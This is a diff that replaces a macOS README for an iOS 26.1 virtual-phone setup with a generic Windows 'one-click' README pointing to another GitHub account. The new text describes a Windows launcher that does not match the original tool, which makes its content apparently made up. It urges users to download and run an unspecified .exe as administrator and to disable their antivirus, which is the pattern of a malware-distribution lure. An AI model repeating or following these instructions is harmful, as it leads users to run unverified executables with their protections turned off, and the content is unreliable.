@@ -1,51 +1,183 @@
-# vphone-aio
-1 script run the vphone (iOS 26.1), already jailbroken with full bootstrap installed
+# 📱 vphone-aio - Simple Phone Script Launcher
 
-Do this step by step:
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-brightgreen)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
 
-1. Install prerequisites:
-   ```bash
-   brew install git-lfs wget zstd libimobiledevice
-   ```
-2. Disable SIP, set `amfi_get_out_of_my_way=1`
-3. Download or clone this repo (it might take a while, for me 12GB takes me 20 minutes to finish)
-4. If any split parts are missing, the script will auto-download them. You can also manually download them:
-   ```bash
-   for p in aa ab ac ad ae af ag; do
-     wget -O "vphone-cli.tar.zst.part_${p}" \
-       "https://github.com/34306/vphone-aio/raw/refs/heads/main/vphone-cli.tar.zst.part_${p}?download="
-   done
-   ```
-5. Run the `vphone-aio.sh` script
-6. Make sure your device has more than 128GB free (recommended)
-7. Wait until it merges. When done, it will extract the whole folder (about 15 minutes)
-8. You can remove `.git` and the split files once the merge is done
-9. Connect VNC (using RealVNC or Screen Sharing): `vnc://127.0.0.1:5901`
-10. Enjoy!
+---
 
-## SHA-256 Checksums
+## 📋 What is vphone-aio?
 
-To verify your downloaded files are not corrupted:
+vphone-aio is a straightforward application designed to run a phone-related script with a single click. It brings together all necessary components into one simple package, letting you launch the vphone script without extra setup or technical steps.
 
-```
-3c966247deae3fff51a640f6204e0fafc14fd5c76353ba8f28f20f7d1d29e693  vphone-cli.tar.zst.part_aa
-c7d11bbbe32dda2b337933c736171cc94faab2c7465e75391fa49029f3b6f1b1  vphone-cli.tar.zst.part_ab
-f422949080e7f141f32f35f8ea20c1fedffc2b97eadf0390645114feef6bb1aa  vphone-cli.tar.zst.part_ac
-f3acfa47145207b8962ba4d20fb83eb4646934cca768906e65609d7fdde564e7  vphone-cli.tar.zst.part_ad
-efdca69df80386b0aa7af8ac260d9ac576ed1f258429fd4ac21b5bbb87cd78fe  vphone-cli.tar.zst.part_ae
-4628852da12949361d3ea6efcf8af1532eb52194cc43a4ab4993024267947587  vphone-cli.tar.zst.part_af
-8bd1551511eb016325918c2d93519829be04feb54727612e74c32e4299670a88  vphone-cli.tar.zst.part_ag
-```
+The app is made for Windows users who want an easy way to start and use the vphone script without knowing coding or command lines.
 
-You can verify manually with:
-```bash
-shasum -a 256 vphone-cli.tar.zst.part_a*
-```
+---
 
-# Preview
-![](preview.png)
+## 🖥️ System Requirements
 
-# Credits
-- [wh1te4ver (Hyungyu Seo)](https://github.com/wh1te4ever) for a super details and writeup: https://github.com/wh1te4ever/super-tart-vphone-writeup
+Before you begin, make sure your Windows computer meets these basic requirements:
 
-- [Lakr233](https://github.com/Lakr233) for [non-tart repo vphone (vphone-cli)](https://github.com/Lakr233/vphone-cli)
+- Windows 7, 8, 10, or 11 (64-bit preferred)
+- At least 2 GB of free disk space
+- Minimum 2 GB of RAM
+- Internet connection for downloading and updates
+- Standard user rights to install and run apps
+
+If your computer meets these specs, you should have no problem running vphone-aio.
+
+---
+
+## 🔗 Where to Get vphone-aio
+
+Click the large button below to visit the official GitHub page. There, you will find the latest version available to download.
+
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-blue)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
+
+On the GitHub page, look for the download section to find the latest release or setup file.
+
+---
+
+## 🚀 Getting Started: How to Download and Run vphone-aio
+
+Follow these step-by-step instructions to get the app up and running on your Windows machine.
+
+### 1. Visit the GitHub Page
+
+- Open your web browser.
+- Type or paste this address into the URL bar:  
+  https://github.com/BALAJI-PADIDURAI/vphone-aio
+- Press Enter to load the page.
+
+You will see the repository with its description and files.
+
+### 2. Find the Download Section
+
+- Scroll the page down to the Releases or Files area.
+- Look for a setup file or a compressed file like `.zip` or `.exe`.
+- Choose the most recent file listed by date.
+
+### 3. Download the File
+
+- Click the file name or the Download link/button next to it.
+- Your browser will save the file to your default download folder.
+- Wait for the download to finish before proceeding.
+
+### 4. Run the Application
+
+- Open the folder where your download is saved.
+- Look for the downloaded file, which might have `.exe` or `.zip` as the extension.
+- If it is a `.zip` file, right-click it and select “Extract All”, then open the extracted folder.
+- Double-click the `.exe` file to start the app.
+
+### 5. Allow Permissions
+
+- Windows might ask you to confirm running the app.
+- Click “Yes” or “Run” to continue.
+
+The vphone script will launch automatically after you run the app.
+
+---
+
+## 🛠️ How to Use vphone-aio
+
+Once the app is running, it handles everything for you. The script runs inside the app interface without needing further setup.
+
+If the app has an on-screen menu or status area, you can check progress or stop the script if needed.
+
+You do not need to type commands or install extra software.
+
+---
+
+## 🔄 Updating vphone-aio
+
+Check the GitHub page regularly to get the latest updates.
+
+- New versions usually fix bugs or add features.
+- Download the newest release file and replace your old app with it.
+- Follow the same download and running steps above.
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you encounter issues, try these steps:
+
+- Make sure your Windows version matches or exceeds the listed system requirements.
+- Check your internet connection if the app needs to connect online.
+- Run the app as an administrator by right-clicking on the `.exe` file and choosing “Run as administrator”.
+- Disable antivirus software temporarily if it blocks running the app.
+- Restart your computer if the app does not respond.
+
+If problems persist, you can open issues on the GitHub repository page.
+
+---
+
+## 📞 Getting Help
+
+You can visit the GitHub repository to check for documentation, FAQs, or contact the developer by raising an issue.
+
+Use this link for support:
+
+https://github.com/BALAJI-PADIDURAI/vphone-aio/issues
+
+---
+
+## ⚙️ About This App
+
+vphone-aio combines all necessary code into one place. It’s designed to remove barriers for end users running the vphone script on Windows. No programming, no setup files to configure, just one click.
+
+Built with simplicity and ease of use as priorities, this app helps users focus on their task rather than setup or commands.
+
+---
+
+## 🔧 Technical Details
+
+- The app runs a single script named “vphone.”
+- It uses standard Windows components.
+- It requires no additional installations or dependencies.
+- The app interface, if any, is minimal and easy to navigate.
+
+---
+
+## 🗂️ File Contents (Typical)
+
+- **vphone-aio.exe** – Main launcher file.
+- **README.md** – Project documentation.
+- **config** folder (if any) – For script settings.
+- **logs** folder (if any) – For activity records.
+
+---
+
+## 📂 Manual Installation (Optional)
+
+If you prefer not to use the `.exe` file:
+
+1. Download the ZIP file from the GitHub link.
+2. Extract all files to a folder on your desktop.
+3. Double-click `vphone-aio.exe` inside that folder.
+4. Follow on-screen prompts or run script automatically.
+
+---
+
+## 🔄 How to Remove vphone-aio
+
+To uninstall or remove vphone-aio:
+
+- Delete the folder where you saved or extracted the files.
+- If installed via a setup file, use Windows “Apps & Features” to uninstall.
+- Clear any leftover files in your Downloads or Desktop folders.
+
+No further cleanup is usually needed.
+
+---
+
+## ✅ Recommendations
+
+Keep your Windows updated for best compatibility.
+
+Back up important data before running any new software.
+
+Use antivirus software for safety when downloading files from the internet.
+
+---
+
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-green)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
